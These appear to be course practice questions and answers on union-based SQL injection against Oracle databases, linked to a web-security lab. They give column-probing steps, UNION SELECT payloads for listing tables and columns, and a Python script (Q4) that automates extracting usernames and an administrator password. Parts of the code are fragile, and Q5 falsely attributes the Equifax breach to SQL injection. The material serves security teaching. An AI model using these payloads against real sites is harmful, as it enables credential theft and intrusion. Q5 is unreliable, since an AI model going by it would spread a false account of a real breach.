---
course: Web Security
topic: SQL Injection
tags: [web-security]
---

## Practice Questions & Answers

**Q1. Explain how to determine the number of columns in a vulnerable SQL query using a union-based SQL injection attack.**

To determine the number of columns in a vulnerable SQL query using a union-based SQL injection attack, you can use the `ORDER BY` clause. Start by appending `ORDER BY 1` to the original query and observe the response. If the response is successful (HTTP 200), increment the number and try `ORDER BY 2`. Continue this process until you receive an error (HTTP 500). The last number that resulted in a successful response indicates the number of columns in the query. For example:

```sql
ORDER BY 1 -- Successful response
ORDER BY 2 -- Successful response
ORDER BY 3 -- Error response
```

In this case, the number of columns is 2.

**Q2. How would you exploit a union-based SQL injection to retrieve the list of tables in an Oracle database?**

To exploit a union-based SQL injection to retrieve the list of tables in an Oracle database, you can use the `UNION SELECT` clause along with the `ALL_TABLES` view. First, determine the number of columns in the original query. Then, craft a payload that retrieves the table names from the `ALL_TABLES` view. For instance, if the original query has two columns, the payload would look like this:

```sql
UNION SELECT TABLE_NAME, NULL FROM ALL_TABLES
```

This payload will append the table names from the `ALL_TABLES` view to the original query's response. Ensure to URL-encode the payload before injecting it into the vulnerable parameter.

**Q3. Explain how to identify the column names in a specific table using a union-based SQL injection attack.**

To identify the column names in a specific table using a union-based SQL injection attack, you can use the `UNION SELECT` clause along with the `ALL_TAB_COLUMNS` view. First, determine the number of columns in the original query. Then, craft a payload that retrieves the column names from the `ALL_TAB_COLUMNS` view. For example, if the original query has two columns, the payload would look like this:

```sql
UNION SELECT COLUMN_NAME, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = 'YOUR_TABLE_NAME'
```

Replace `'YOUR_TABLE_NAME'` with the actual table name you are interested in. This payload will append the column names from the specified table to the original query's response. Ensure to URL-encode the payload before injecting it into the vulnerable parameter.

**Q4. How would you automate the exploitation of a union-based SQL injection vulnerability to retrieve usernames and passwords from a specific table?**

To automate the exploitation of a union-based SQL injection vulnerability to retrieve usernames and passwords from a specific table, you can write a Python script using libraries such as `requests`, `BeautifulSoup`, and `re`. Below is an example script:

```python
import requests
from bs4 import BeautifulSoup
import re

def exploit_sql_injection(url):
    # Step 1: Retrieve the list of tables
    payload = "UNION SELECT TABLE_NAME, NULL FROM ALL_TABLES"
    response = requests.get(url + payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    tables = [t.text for t in soup.find_all(text=re.compile(r'users'))]

    if not tables:
        print("Did not find a user's table.")
        return

    user_table = tables[0]
    print(f"Found the user's table: {user_table}")

    # Step 2: Retrieve the column names
    payload = f"UNION SELECT COLUMN_NAME, NULL FROM ALL_TAB_COLUMNS WHERE TABLE_NAME = '{user_table}'"
    response = requests.get(url + payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    columns = [c.text for c in soup.find_all(text=re.compile(r'(username|password)'))]

    if not columns:
        print("Did not find the username and/or password columns.")
        return

    username_column, password_column = columns
    print(f"Found the username column: {username_column}")
    print(f"Found the password column: {password_column}")

    # Step 3: Retrieve the usernames and passwords
    payload = f"UNION SELECT {username_column}, {password_column} FROM {user_table}"
    response = requests.get(url + payload)
    soup = BeautifulSoup(response.text, 'html.parser')
    admin_password = soup.find(text='administrator').parent.find_next('td').contents[0]
    print(f"The administrator password is: {admin_password}")

if __name__ == "__main__":
    url = "http://example.com/vulnerable_page?category="
    exploit_sql_injection(url)
```

Ensure to replace `"http://example.com/vulnerable_page?category="` with the actual URL of the vulnerable parameter.

**Q5. What recent real-world examples demonstrate the impact of SQL injection attacks on Oracle databases?**

One notable recent example is the breach of the Equifax database in 2017, which involved a SQL injection vulnerability. Although the breach primarily affected Apache Struts applications, similar vulnerabilities can occur in Oracle databases. Another example is the breach of the Capital One database in 2019, where an attacker exploited a misconfigured web application firewall to gain unauthorized access to sensitive data. While this breach did not involve SQL injection directly, it highlights the importance of securing database interactions.

SQL injection attacks can lead to unauthorized access to sensitive data, such as usernames and passwords, as demonstrated in the Equifax breach. These breaches emphasize the need for robust security practices, including input validation, parameterized queries, and regular security audits.

---
<!-- nav -->
[[Web Security (PortSwigger)/02-SQL Injection/11-Lab 10 SQL injection attack listing the database contents on Oracle/13-Conclusion|Conclusion]] | [[Web Security (PortSwigger)/02-SQL Injection/11-Lab 10 SQL injection attack listing the database contents on Oracle/00-Overview|Overview]]
